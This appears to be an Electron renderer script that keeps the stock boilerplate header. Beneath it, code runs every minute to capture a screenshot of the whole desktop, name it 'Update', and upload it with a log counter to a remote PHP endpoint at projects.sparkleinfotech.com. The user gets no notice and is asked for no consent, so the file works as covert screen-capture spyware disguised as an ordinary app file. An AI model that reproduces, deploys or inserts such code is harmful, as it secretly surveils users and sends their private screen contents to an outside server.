// This file is required by the index.html file and will
// be executed in the renderer process for that window.
// No Node.js APIs are available in this process because
// `nodeIntegration` is turned off. Use `preload.js` to
// selectively enable features needed in the rendering
// process.

var cron = require("node-cron");
const request = require("request");
const screenshot = require("screenshot-desktop");
var fs = require("fs");
var log = 0;
cron.schedule("*/1  * * * *", () => {
  log = log + 1;
  screenshot({ filename: "Update" + log + ".jpg" }).then((imgPath) => {
    var data = {
      file: fs.createReadStream(imgPath),
    };
    request.post(
      {
        url: "http://projects.sparkleinfotech.com/nodeLog/updatelog.php",
        formData: data,
      },
      function callback(err, response, body) {
        if (err) {
          return console.error("Failed to upload:", err);
        }
        console.log("Upload successful!");
      }
    );
  });
  document.write("Update" + log);
  document.write("Update" + log + ".jpg");
  var options = {
    method: "POST",
    url: "http://projects.sparkleinfotech.com/nodeLog/updatelog.php",
    headers: {
      "cache-control": "no-cache",
      "content-type":
        "multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW",
    },
    formData: { log: "Update" + log },
  };
  request(options, function (error, response, body) {
    if (error) throw new Error(error);
    console.log(body);
  });
});
